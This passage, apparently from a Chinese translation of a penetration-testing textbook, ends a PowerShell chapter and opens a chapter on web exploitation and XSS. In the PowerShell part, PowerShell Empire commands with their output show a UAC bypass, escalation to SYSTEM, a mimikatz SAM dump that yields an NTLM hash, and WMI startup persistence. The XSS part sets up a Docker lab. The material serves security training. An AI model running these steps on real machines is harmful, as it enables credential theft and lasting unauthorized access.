

你可能会看到一个提示，要求允许程序以管理员身份访问。是否这样做完全取决于目标系统上 UAC 的配置方式。我们可以通过输入 agents 并查找用户旁的星号（*）来验证我们是否拥有提升的权限 shell，这表示具有提升的权限：

```
(Empire: powershell/privesc/bypassuac) > agents

[*] Active agents:
```

| 名称 | 语言 | 内部 IP | 机器名 | 用户名 | 进程 | 延迟 | 最后出现 |
|------|------|-------------|--------------|----------|---------|-------|-----------|
| 5CXZ94HP | ps | 192.168.1.13 | DESKTOP-KRB3MSI | DESKTOP-KRB3MSI\User | powershell/6108 | 5/0.0 | 2017-11-10 03:04:05 |
| 6GEC5UVM | ps | 192.168.1.13 | DESKTOP-KRB3MSI | *DESKTOP-KRB3MSI\User | powershell/4004 | 5/0.0 | 2017-11-10 03:04:09 |

下一步是使用这些提升的权限成为 SYSTEM 用户。我们将执行 getsystem 模块来完成此操作：

```
(Empire: agents) > interact 6GEC5UVM
(Empire: 6GEC5UVM) > usemodule privesc/getsystem*
(Empire: powershell/privesc/getsystem) > execute
[>] Module is not opsec safe, run? [y/N] y
(Empire: powershell/privesc/getsystem) >
Running as: WORKGROUP\SYSTEM
```

现在我们以 SYSTEM 身份运行，可以从该机器上收集凭据。我们将使用 mimikatz 来完成此操作，类似于我们在 PowerSploit 部分所做的。我们将在凭据部分下执行 mimikatz/sam 模块来获取 SAM 转储，就像我们使用 PowerSploit 时所做的那样：

```
(Empire: powershell/privesc/getsystem) > usemodule powershell/credentials/mimikatz/sam
(Empire: powershell/credentials/mimikatz/sam) > execute
(Empire: powershell/credentials/mimikatz/sam) >
Job started: 4SCVZ7
Hostname: DESKTOP-KRB3MSI / S-1-5-21-3929919845-4074983535-3314702914
.####. mimikatz 2.1 (x64) built on Dec 11 2016 18:05:17
.## ^ ##. "A La Vie, A L'Amour"
## \ / ## /** */
## \ / ## Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
'## v ##' http://blog.gentilkiwi.com/mimikatz (oe.eo)
'######' with 20 modules * * */
mimikatz(powershell) # token::elevate
Token Id : 0
User name :
SID name : NT AUTHORITY\SYSTEM
604   34207   NT AUTHORITY\SYSTEM   S-1-5-18   (04g,21p)   Primary
-> Impersonated !
* Process Token : 1172717   DESKTOP-KRB3MSI\User   S-1-5-21-3929919845-4074983535-3314702914-1001   (18g,24p)   Primary
* Thread Token : 1203177   NT AUTHORITY\SYSTEM   S-1-5-18   (04g,21p)
   Impersonation (Delegation)

mimikatz(powershell) # lsadump::sam
Domain : DESKTOP-KRB3MSI
SysKey : a34b3d05aec244baf6e966715bd6b6c9
Local SID : S-1-5-21-3929919845-4074983535-3314702914

SAMKey : cb8862eacfc719e1cc72f3309745d07a

RID : 000001f4 (500)
User : Administrator
LM :
NTLM :

RID : 000001f5 (501)
User : Guest
LM :
NTLM :

RID : 000001f7 (503)
User : DefaultAccount
LM :
NTLM :

RID : 000003e9 (1001)
User : User
LM :
NTLM : 64f12cddaa88057e06a81b54e73b949b
```

我们现在有一个可以进行破解的 NTLM 哈希。下一步是添加持久化，以便在重启后重新建立连接。在 Empire 中这比在 PowerSploit 中简单得多。我们只需使用持久化模块并执行它：

```
(Empire: powershell/credentials/mimikatz/sam) >
usemodule powershell/persistence/elevated/wmi
(Empire: powershell/persistence/elevated/wmi) > set Listener http
(Empire: powershell/persistence/elevated/wmi) > execute
[>] Module is not opsec safe, run? [y/N] y
(Empire: powershell/persistence/elevated/wmi) >
WMI persistence established using listener http with OnStartup WMI subscription trigger.
```

我们现在已通过 WMI 设置了启动持久化，因此我们应该能够重启 Windows 机器并重新获得 shell。

## 摘要

PowerShell 是 Windows 系统上最强大的工具之一。在本章中，我们探讨了围绕运行 PowerShell 脚本的不同安全约束。我们还探讨了如何使用各种不同的技术绕过这些约束。

一旦你绕过这些限制，就可以使用 PowerSploit 和 PowerShell Empire 等其他框架。这些工具允许你在系统上获取额外访问权限、保持持久性并外发数据。

通过使用这些技术，你可以“利用现有资源”，这意味着你只使用目标系统上已有的内容。不需要额外的二进制文件。因为你的某些页面可能会被网络防病毒软件捕获，我们还探讨了如何规避签名以实现代码执行。最终，你将拥有在重启后保持持久性的代理，以及一系列用于在收集和外发数据的同时保持对目标系统访问权限的工具。

## 进一步阅读

- [PowerShell Empire 主页](www.powershellempire.com/)
- [PowerSploit 文档](http://powersploit.readthedocs.io/en/latest/)

## 参考文献

- 1. Matthew Dunwoody，“通过 PowerShell 日志获得更高可见性”，FireEye，2016 年 2 月 11 日，https://www.fireeye.com/blog/threat-research/2016/02/greater_visibilityt.html。
- 2. Carrie Roberts，“如何绕过防病毒软件运行 Mimikatz”，Black Hills Information Security，2017 年 1 月 5 日，https://www.blackhillsinfosec.com/bypass-anti-virus-run-mimikatz/.

## 第 16 章

## 下一代 Web 应用程序利用

Web 利用的基础知识在之前的版本以及网络上已有详尽介绍。然而，一些更高级的技术有点难以理解，因此在本章中，我们将探讨 2014 年至 2017 年期间登上头条的一些攻击技术。我们将深入研究这些技术，以更好地理解下一代 Web 攻击。

具体来说，本章涵盖以下主题：

- 跨站脚本（XSS）的演变
- 框架漏洞
- 填充甲醛攻击

### 跨站脚本（XSS）的演变

跨站脚本（XSS）是当今最被误解的 Web 漏洞之一。当有人提交代码而不是预期的输入，并且它更改了浏览器中 Web 应用程序的行为时，就会发生 XSS。从历史上看，这种漏洞曾被攻击者用作网络钓鱼活动和会话窃取攻击的一部分。随着应用程序变得更加复杂，过去与旧版应用程序一起有效的许多东西可能不再有效。然而，因为随着每种新技术，我们似乎都必须重新学习关于安全的同样教训，XSS 依然存在——只是变得更加难以利用。

传统上，此类漏洞通过一个简单的警告对话框来演示，显示代码已运行。由于这种相对良性的演示方式，许多组织不了解 XSS 的影响。使用诸如浏览器利用框架（BeEF）之类的框架以及更复杂的代码，XSS 可能导致从浏览器利用到数据窃取再到拒绝服务的各种后果。有些人使用浏览器挖掘加密货币，所有这些都可以通过 XSS 执行。

现在你了解了一些 XSS 的历史，让我们看看实际中的一些示例。在本章的这一部分中，我们将逐步讲解难度逐渐增加的 XSS 示例，以帮助你进一步理解 XSS 是什么，以及如何在当今的浏览器中与其交互。

### 设置环境

在本章中，我们将使用至少分配 4GB 内存给系统的 Kali 64 位版本。我们已经拥有所需的大部分软件，但为了更轻松地使用我们的环境，我们将安装一个名为 Docker 的 DevOps 工具，它可以让我们快速部署环境，几乎就像运行虚拟机（VM）一样。我们还将使用本书 GitHub 仓库中第 16 章区域的若干文件。

首先，克隆本书的 GitHub 仓库。现在我们需要设置 Docker。为此，以 root 身份运行第 16 章中的 setup_docker.sh 程序。这将在向 Kali 添加所需存储库后安装必要的软件包，然后配置 Docker 在重启时启动。这样，你在重启时就不需要处理 Docker 机制，而只需在启动或停止实例时处理即可。脚本完成后，一切都应已安装完毕，可以继续。

我们需要安装 Google Chrome，因此请在 Kali 浏览器中访问 [Google Chrome](https://www.google.com/chrome/browser/) 并下载 .deb 软件包。按以下方式安装 Chrome：

```
# dpkg -i google-chrome-stable_current_amd64.deb
Selecting previously unselected package google-chrome-stable.
(Reading database ... 351980 files and directories currently installed.)
Preparing to unpack google-chrome-stable_current_amd64.deb ...
Unpacking google-chrome-stable (61.0.3163.100-1) ...
```

![](img/5f597c6a70133069118d9e804ace3775_435_0.png)

注意 如果 Chrome 软件包安装出错，可能是由于依赖项问题。要修复该问题，请运行命令 apt --fix-broken install 并允许它安装先决条件。最后，你应该会看到 Chrome 安装成功。

接下来，我们需要为本章的 XSS 部分构建我们网站的 Docker 镜像。从第 16 章的 GitHub 仓库中，进入 XSS 目录，创建 Docker 镜像，然后运行它，如下所示：

```
root@kali:~/Ch16# cd XSS
root@kali:~/Ch16/XSS# docker build -t xss .
Sending build context to Docker daemon 3.393MB
Step 1/2 : FROM nimmis/apache-php5
---> 862dcaafdb11
Step 2/2 : ENV DEBIAN_FRONTEND noninteractive
---> Using cache
---> 47a723405265
Successfully built 47a723405265
Successfully tagged xss:latest
```

现在，运行 Docker：

